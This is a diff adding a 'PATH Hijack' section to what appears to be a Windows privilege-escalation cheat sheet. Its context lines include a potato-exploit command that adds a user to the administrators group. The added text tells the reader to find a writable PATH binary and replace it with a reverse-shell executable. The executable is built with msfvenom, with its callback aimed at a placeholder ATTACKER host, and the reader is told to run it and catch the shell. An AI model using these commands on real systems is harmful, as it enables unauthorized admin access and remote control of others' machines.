@@ -75,6 +75,22 @@ For Sigma potato:
 .\sp.exe "net localgroup administrators user /add"
 ```
 
+## PATH Hijack
+PowerUp may show with write permissions to the PATH directory
+
+Like:
+```
+Backup.exe
+```
+Check with accesschk.exe/icals 
+
+replace it with your own:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe > backup.exe
+```
+Then, after sharing it, run it, and check the shell.
+
 ## Links
 
 I go over a lot more tactics here in this blog post:
